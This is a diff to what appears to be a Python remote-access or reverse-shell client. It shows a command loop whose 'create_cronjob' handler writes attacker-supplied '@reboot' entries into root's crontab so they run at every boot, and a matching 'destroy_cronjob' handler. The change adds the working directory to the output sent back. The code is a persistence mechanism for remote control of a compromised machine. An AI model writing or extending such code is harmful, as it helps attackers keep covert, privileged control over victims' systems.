@@ -44,15 +44,18 @@ while True:
                 else:
                     # if operation is successful, empty message
                     output = ""
+
             elif splited_command[0].lower() == "create_cronjob":
                 # create a cronjob that starts with the machine
                 cronjob = f"@reboot {command[15:]}\n"
                 # write the cronjob to the crontab file
                 with open('/var/spool/cron/crontabs/root', 'a') as file:
                     file.write(cronjob)
+                # get the current working directory as output
+                cwd = os.getcwd()
                 # set the output to success message
-                output = "Cronjob created successfully!"
-                
+                output = f"Cronjob created successfully!{SEPARATOR}{cwd}"
+
             elif splited_command[0].lower() == "destroy_cronjob":
                 # read the current cron jobs
                 with open('/var/spool/cron/crontabs/root', 'r') as file:
